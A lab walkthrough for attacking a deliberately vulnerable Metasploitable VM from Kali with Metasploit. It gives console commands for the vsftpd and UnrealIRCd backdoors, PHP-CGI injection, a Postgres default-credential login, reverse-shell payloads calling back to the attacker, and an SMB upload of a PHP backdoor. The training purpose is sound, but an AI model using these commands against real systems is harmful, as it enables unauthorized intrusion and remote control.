## Metasploit on the Linux Metasploitable2 

Here are several labs on running Metasploit from Kali on a Metasploitable3 Linux VM. Please make sure when you execute these labs you verify that home environment setup is working properly and you are able to scan the Metasploitable 3 Linux host from Kali using NMAP. Typically when you find the Metasploitable3 system it will have 5 or more open ports. This walkthrough is intended to get your familiar with the Metasploit tool and the options required to successfully execute the exploit.

1. Start by searching for exploit based on port number and NMAP scan results of the NMAP -sV -O scan of your taget with the greatest number of open ports.

Example: `grep exploit search vsftp`

2. Next run the use command with the exploit based on your search. If multiple exploits are found with that specific exploit name you may need to run each one seperately.

Example: `use exploit/unix/ftp/vsftpd_234_backdoor`

3. Next use the `show options` command to show the options required to execute the exploit

In this example the required options for vsftp are the following

RHOSTS = IP Address of host you are attacking `xxx.xxx.xxx.xxx`

RPORT = Port you are attacking which is port = `21`

Payload = In this example we used the following payload = `set payload cmd/unix/interact`

4. Finally to run the exploit you can use the `run` or `exploit` command to execute it.

## Apache 2.2.8

1. Start by searching for exploit based on port number and NMAP scan results of the NMAP -sV -O scan of your taget with the greatest number of open ports.

Example: `grep exploit search apache`

2. Since we have so many Apache exploits lets use an Auxlilary scanner to search for any potential exploits we can use.

`use auxiliary/scanner/http/dir_listing`

`set rhosts xxx.xxx.xxx.xxx`

`show options`

`run`

3. Since that was successful lets use an Auxlilary directory scanner to search for any potential exploits we can use.

`use auxiliary/scanner/http/dir_scanner`

`show options`

`run`

`set rhosts xxx.xxx.xxx.xxx`

`run`

4. Since that was successful lets use an Auxlilary file scanner to search for any potential exploits we can use.

`use auxiliary/scanner/http/files_dir`

`show options`

`run`

`set rhosts xxx.xxx.xxx.xxx`

`run`

5. Since that was successful lets use the verbose authorization bypass to search for any potential exploits we can use.

`use auxiliary/scanner/http/verb_auth_bypass`

`show options`

`set rhosts xxx.xxx.xxx.xxx`

`run`

6. Since that was unsuccessful lets use the php_cgi injection exploit to search for any potential exploits we can use.

`use exploit/multi/http/php_cgi_arg_injection`

`set rhosts xxx.xxx.xxx.xxx`

`show options`

`set lhost xxx.xxx.xxx.xxx`

`set lport 4444`

`run` or `exploit`

## Postgres

1. Start by searching for exploit based on port number and NMAP scan results of the NMAP -sV -O scan of your taget with the greatest number of open ports.

Example: `grep exploit search postgres`

2. Now lets use the auxiliary scanner for postgres

`use auxiliary/scanner/postgres/postgres_login`

`set rhosts xxx.xxx.xxx.xxx`

`show options`

`set user_as_pass true`

`set username postgres`

`run` or `exploit`

3. The exploit was successful so you can now login to the system as the username and password with the same credentials by using the folloing sytax

`psql -h xxx.xxx.xxx.xxx -U postgres -W`

## Unreal IRC

1. Start by searching for exploit based on port number and NMAP scan results of the NMAP -sV -O scan of your taget with the greatest number of open ports.

Example: `grep exploit search unreal`

2. Now lets use the unreal exploit

`use exploit/unix/irc/unreal_ircd_3281_backdoor`

`set rhost xxx.xxx.xxx.xxx` (IP of the host you are attacking)

`set rport 6697` (Port number IRC app is listening on)

`set lhost xxx.xxx.xxx.xxx` (IP of the Kail VM you are attacking from)

`set lport 4444` (Port on your system exploit and payload runs to create session)

`set payload cmd/unix/reverse`

## Samba FTP

`use auxiliary/admin/smb/upload_file`

`set rhosts xxx.xxx.xxx.xxx`

`set rport 445`

`set rport_ftp 21`

`set smbshare public`

`set smbuser chewbacca`

`set lpath /tmp/backdoor.php`

`set rpath backdoor.php`

`set lhost xxx.xxx.xxx.xxx` (this should be your kali linux IP address)

`set lport 4444` (Port on your system exploit and payload runs to create session)
